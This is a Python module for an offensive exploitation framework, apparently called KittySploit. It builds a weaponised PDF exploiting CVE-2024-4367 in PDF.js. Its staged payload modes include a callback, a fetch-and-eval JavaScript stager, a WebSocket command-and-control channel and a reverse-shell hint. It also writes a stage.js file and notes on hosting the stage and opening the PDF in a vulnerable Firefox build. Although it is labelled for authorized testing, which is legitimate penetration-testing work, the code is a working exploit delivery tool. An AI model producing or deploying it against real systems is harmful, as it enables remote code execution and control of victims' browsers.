#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pathlib import Path
from typing import List

from kittysploit import *
from lib.pdf.rce import (
    build_pdfjs_js,
    build_stage_js_template,
    create_pdfjs_fontmatrix_rce,
    write_listener_notes,
)
from lib.pdf.mixins import PdfRceMixin


class Module(Auxiliary, PdfRceMixin):
    __info__ = {
        "name": "PDF CVE-2024-4367 PDF.js Staged Delivery",
        "description": (
            "Generate a CVE-2024-4367 FontMatrix PDF with staged JavaScript for authorized "
            "testing: callback, fetch+eval stager, or WebSocket C2. Uses CALLBACK_URL "
            "(not LHOST). PDF.js runs in a browser sandbox — for OS reverse shells use "
            "exploits/multi/fileformat/* with framework PAYLOAD."
        ),
        "author": ["KittySploit Team"],
        "references": [
            "https://codeanlabs.com/2024/05/cve-2024-4367-arbitrary-js-execution-in-pdf-js/",
        ],
        "tags": ["pdf", "cve-2024-4367", "pdfjs", "stager", "authorized-only"],
    }

    MODULE_TITLE = "CVE-2024-4367 PDF.js staged delivery"
    OUTPUT_BASENAME = "cve_2024_4367_staged.pdf"
    CVE_IDS = ["CVE-2024-4367"]

    payload_mode = OptChoice(
        "fetch_stager",
        "Staged payload mode",
        required=True,
        choices=["callback", "fetch_stager", "websocket_c2", "reverse_shell_hint"],
    )

    def generate_pdf_rce_artifacts(self, output_path: Path) -> List[Path]:
        mode = str(self.payload_mode)
        stage = self._stage_url()
        js = build_pdfjs_js(
            mode,
            lhost="",
            lport=0,
            stage_url=stage,
        )
        create_pdfjs_fontmatrix_rce(output_path, js)

        out_dir = self._output_dir()
        artifacts: List[Path] = [output_path]

        if mode in ("fetch_stager", "reverse_shell_hint", "websocket_c2"):
            stage_js = out_dir / "stage.js"
            stage_js.write_text(
                build_stage_js_template(mode, lhost="", lport=0),
                encoding="utf-8",
            )
            artifacts.append(stage_js)

        artifacts.append(
            write_listener_notes(
                out_dir,
                title="CVE-2024-4367 PDF.js staged delivery",
                stage_url=stage,
                payload_mode=mode,
                extra=[
                    f"Host stage.js at {stage}/stage.js if using fetch_stager.",
                    "Open the PDF in a vulnerable PDF.js build (Firefox < 126, etc.).",
                ],
            )
        )
        return artifacts

    def run(self):
        return self.run_pdf_rce()
